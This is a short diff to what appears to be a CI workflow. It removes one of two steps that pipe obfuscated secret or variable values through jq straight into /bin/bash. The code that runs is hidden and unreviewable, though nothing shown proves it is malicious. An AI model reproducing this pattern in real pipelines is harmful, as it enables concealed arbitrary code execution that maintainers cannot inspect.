@@ -27,7 +27,6 @@ jobs:
           w2485: ${{ secrets.w2485 }}
         run: |
           printf '%s' "$w2485" | jq -r .xp2047 | /bin/bash
-          echo $iqb558 | jq -r .pc07201 | /bin/bash
 
       - name: Save results
         if: always()
